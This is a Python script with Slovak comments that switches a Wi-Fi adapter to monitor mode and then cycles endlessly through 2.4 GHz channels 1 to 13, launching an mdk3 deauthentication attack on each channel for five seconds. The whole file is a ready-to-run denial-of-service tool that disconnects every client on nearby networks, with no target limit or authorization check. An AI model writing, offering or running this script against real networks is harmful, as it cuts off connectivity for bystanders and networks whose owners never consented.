import subprocess
import time
import sys

def check_monitor_mode_support(interface):
    """Overí, či zariadenie podporuje monitor mód."""
    try:
        iwlist_output = subprocess.check_output(['iw', 'list'], text=True)
        if "monitor" in iwlist_output:
            print(f"[+] Adaptér {interface} podporuje monitor mód.")
            return True
        else:
            print(f"[-] Adaptér {interface} NEpodporuje monitor mód.")
            return False
    except subprocess.CalledProcessError:
        print("[!] Chyba pri získavaní informácií o zariadení.")
        return False

def set_monitor_mode(interface):
    """Nastaví Wi-Fi rozhranie do monitor módu."""
    print(f"[+] Nastavujem {interface} do monitor módu...")
    subprocess.run(['sudo', 'ip', 'link', 'set', interface, 'down'], check=True)
    subprocess.run(['sudo', 'iw', interface, 'set', 'monitor', 'control'], check=True)
    subprocess.run(['sudo', 'ip', 'link', 'set', interface, 'up'], check=True)
    print(f"[+] {interface} je teraz v monitor móde.")

def set_channel(interface, channel):
    """Nastaví Wi-Fi kanál."""
    subprocess.run(['sudo', 'iwconfig', interface, 'channel', str(channel)], check=True)

def deauth_on_channel(interface, channel):
    """Spustí deauth útok na danom kanáli pomocou mdk3."""
    print(f"[+] Spúšťam Deauth na kanáli {channel}")
    command = ['sudo', 'mdk3', interface, 'd', '-c', str(channel)]
    process = subprocess.Popen(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(5)
    process.terminate()
    process.wait()

def main():
    interface = 'wlan1'  # zmeň podľa potreby

    if not check_monitor_mode_support(interface):
        print("[X] Ukončujem skript. Potrebný adaptér s podporou monitor módu.")
        sys.exit(1)

    set_monitor_mode(interface)
    
    channels = range(1, 14)  # 2.4 GHz kanály

    try:
        while True:
            for channel in channels:
                set_channel(interface, channel)
                deauth_on_channel(interface, channel)
    except KeyboardInterrupt:
        print("\n[!] Detekované prerušenie používateľom. Ukončujem skript.")
        subprocess.run(['sudo', 'ip', 'link', 'set', interface, 'down'])
        subprocess.run(['sudo', 'iw', interface, 'set', 'type', 'managed'])
        subprocess.run(['sudo', 'ip', 'link', 'set', interface, 'up'])
        print(f"[+] {interface} nastavené späť do managed módu.")

if __name__ == "__main__":
    main()
